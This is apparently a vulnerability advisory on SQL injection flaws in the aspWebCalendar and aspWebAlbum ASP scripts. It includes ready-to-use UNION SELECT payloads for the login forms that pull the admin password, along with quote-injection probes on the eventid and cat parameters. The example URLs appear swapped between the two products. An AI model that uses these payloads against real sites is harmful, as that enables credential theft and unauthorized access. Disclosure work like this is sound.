[1]Introduction

"aspWebCalendar is an .asp (Active Server Pages) script that allows you to easily create an online events calendar that supports multiple users. Easy installation and usage are the key features of aspWebCalendar. The script contains a text file with a few configuration variables that are used by the script... Just change one of these variables, upload the files and you are up and running."

"aspWebAlbum is an .asp (Active Server Pages) script that allows you to easily create an online photo album or gallery simply by uploading images to your server... the script will do the rest. Easy installation and usage are the key features of aspWebAlbum. The script contains a text file with several configuration variables that are used by the script... just change two of these and you are up and running. To add images simply upload them to your server, its that simple."

[2]The Problem

These two can run on SQL or Access databases, both coming right from the box, and those who use the default sql file are vulnerable to injection, alowing, f.e., an attacker to view the table contents by reading the asp error messages. 

(1) For the aspWebCalendar, in the login pages: 

"www.example.com/album.asp?action=login"

you can put this in the username field (leaving the password blank) to extract the password for the 'admin' user, if it exists:

"  ' union select Cal_User_Password,1,1,1,1,1,1,1,1,1 from Cal_User where Cal_User_UserName = 'admin'--  "

 
  (1.1) the 'eventid' field is vulnerable to sql injection too:
	"www.example.com/calendar.asp?action=eventdetail&eventid='"



(2) For the aspWebAlbum, the login pages can be found at "www.example.com/calendar.asp?action=login" and the problem is the same (i'll use the same example as above) :

	"' union select Gal_UserPassword,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from Gal_Users where Gal_UserUserName = 'admin' --"

	
	(2.2) The 'cat' field is also a problem in this example:
	     "www.example.com/album.asp?cat='"


At the moment all the SQL versions of this software seem to be affected.
